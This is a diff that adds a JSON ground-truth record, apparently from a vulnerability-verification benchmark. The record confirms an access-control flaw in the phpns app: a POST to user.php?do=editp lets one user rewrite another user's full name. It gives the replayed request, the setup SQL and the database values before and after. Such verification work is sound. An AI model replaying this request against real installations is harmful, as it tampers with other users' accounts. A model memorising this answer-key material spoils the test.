@@ -1,0 +1,44 @@
+{
+  "gt_id": "GT-015",
+  "app": "phpns",
+  "verified_at": "2026-09-06T04:57:50.871739+00:00",
+  "verdict": "vulnerable",
+  "summary": "user1 POST user.php?do=editp returned 200; user2 (id=11) full_name changed DRHLGT_usr_before_8670670466 -> DRHLGT_usr_after_8670670466 (updated=True).",
+  "sql_statements": [
+    {
+      "kind": "execute",
+      "sql": "UPDATE phpns_users SET full_name='DRHLGT_usr_before_8670670466' WHERE id=11"
+    },
+    {
+      "kind": "query",
+      "sql": "SHOW COLUMNS FROM phpns_users"
+    },
+    {
+      "kind": "query",
+      "sql": "SELECT * FROM phpns_users WHERE id=11 LIMIT 1"
+    },
+    {
+      "kind": "scalar",
+      "sql": "SELECT full_name FROM phpns_users WHERE id=11"
+    }
+  ],
+  "steps": [
+    {
+      "kind": "instrument",
+      "table": "phpns_users",
+      "row": "id=11 (user2)",
+      "column": "full_name",
+      "token1": "DRHLGT_usr_before_8670670466",
+      "token2": "DRHLGT_usr_after_8670670466"
+    },
+    {
+      "kind": "replay",
+      "role": "user1 (editing another account)",
+      "request": "POST user.php?do=editp id=11 fullname=<token2>",
+      "status_code": 200,
+      "db_full_name_before": "DRHLGT_usr_before_8670670466",
+      "db_full_name_after": "DRHLGT_usr_after_8670670466",
+      "updated": true
+    }
+  ]
+}
